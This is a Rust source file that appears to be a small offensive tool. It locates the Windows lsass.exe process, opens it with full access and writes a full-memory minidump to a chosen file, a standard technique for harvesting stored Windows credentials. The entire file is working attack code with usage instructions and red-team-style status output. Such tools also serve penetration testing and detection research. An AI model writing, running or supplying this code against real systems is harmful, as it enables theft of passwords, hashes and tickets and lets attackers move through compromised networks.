use std::error::Error;
use std::fs::File;
use std::os::windows::io::AsRawHandle;
use std::path::PathBuf;

use sysinfo::System;
use windows::Win32::Foundation::*;
use windows::Win32::System::Diagnostics::Debug::*;
use windows::Win32::System::Threading::*;

const LSASS: &str = "lsass.exe";

/// Implement the main logic of the program
pub fn run(path: &str) -> Result<(), Box<dyn Error>> {
    // Create output file
    println!("[*] Trying to dump to output file: {path}");
    let path = PathBuf::from(path);
    let output = File::create_new(path)?;
    println!("[+] Successfully created output file");

    // Get LSASS pid
    let pid = lsass_pid()?;
    println!("[+] Found {LSASS} pid: {pid}");

    // Open LSASS process
    let proc = unsafe { OpenProcess(PROCESS_ALL_ACCESS, false, pid)? };
    println!("[+] Successfully opened {LSASS} handle: {proc:?}");

    // Dump lSASS memory to output file and do some cleanup
    unsafe {
        MiniDumpWriteDump(
            proc,
            pid,
            HANDLE(output.as_raw_handle()),
            MiniDumpWithFullMemory,
            None,
            None,
            None,
        )?;

        CloseHandle(proc)?;
    }

    println!("[+] Dump successful!");
    Ok(())
}

/// Print usage information
pub fn usage(prog: &str) {
    println!("Usage:");
    println!(".\\{prog} [path\\to\\output_file]");
    println!("\nExamples:");
    println!(".\\{prog}");
    println!(".\\{prog} out.dmp");
}

/// Get LSASS pid
fn lsass_pid() -> Result<u32, Box<dyn Error>> {
    // Load system information
    let mut sys = System::new_all();
    sys.refresh_all();

    // Find LSASS process
    let proc = sys
        .processes_by_exact_name(LSASS)
        .next()
        .ok_or("Process not found")?;

    // Return pid
    Ok(proc.pid().as_u32())
}
